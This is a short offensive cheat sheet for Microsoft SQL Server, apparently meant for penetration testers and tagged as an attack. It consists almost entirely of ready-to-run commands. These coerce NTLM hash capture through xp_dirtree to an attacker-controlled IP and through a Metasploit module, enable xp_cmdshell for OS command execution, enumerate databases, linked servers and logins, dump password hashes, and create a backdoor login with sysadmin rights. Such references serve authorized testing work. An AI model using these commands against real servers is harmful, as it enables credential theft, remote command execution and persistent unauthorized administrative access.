# mssql-cmd

% mssql, Microsoft SQL Server, 1433
#plateform/linux  #target/remote  #protocol/sql  #port/1433 #cat/ATTACK

## Hash gathering
```
xp_dirtree '\\<local_ip>\any\thing'
exec master.dbo.xp_dirtree '\\<local_ip>\any\thing'
msfconsole -x "use auxiliary/admin/mssql/mssql_ntlm_stealer"
```

## turns on advanced options
```
sp_configure 'show advanced options', '1'
RECONFIGURE
```

## enables xp_cmdshell (turn on advanced options)
```
sp_configure 'xp_cmdshell', '1'
RECONFIGURE
```

## execute command
```
EXEC master..xp_cmdshell '<cmd|whoami>'
```

## Get databases
```
SELECT name FROM master.dbo.sysdatabases
```

## Get table names
```
SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES;
```

## Get Linked Servers
```
EXEC sp_linkedservers
SELECT * FROM sys.servers;
```

## Get users
```
select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
```

## Create user with sysadmin privs
```
CREATE LOGIN jubeaz WITH PASSWORD = '<password|Jube@z123!'
sp_addsrvrolemember 'jubeaz', 'sysadmin'
```

## check admin rights
```
IS_SRVROLEMEMBER('sysadmin');
```
